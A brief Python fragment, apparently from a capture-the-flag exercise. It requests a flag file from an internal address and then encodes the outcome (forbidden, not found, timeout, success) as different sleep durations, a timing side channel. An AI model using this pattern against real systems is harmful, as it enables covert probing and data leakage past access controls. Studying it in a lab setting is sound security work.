...
req = urllib.request.Request(
    'https://10.0.0.29/userd8a2f72fe43094e8/flag.txt',
    headers={
        'User-Agent': 'REDACTED',
...
if "HTTP Error" in val:
    if "403" in val:
        time.sleep(1) # 403 Forbidden
    elif "404" in val:
        time.sleep(2) # 404 Not Found
else:
    if "timed out" in val:
        time.sleep(3)
    else:
        time.sleep(4) # Success! Or some other error
"""
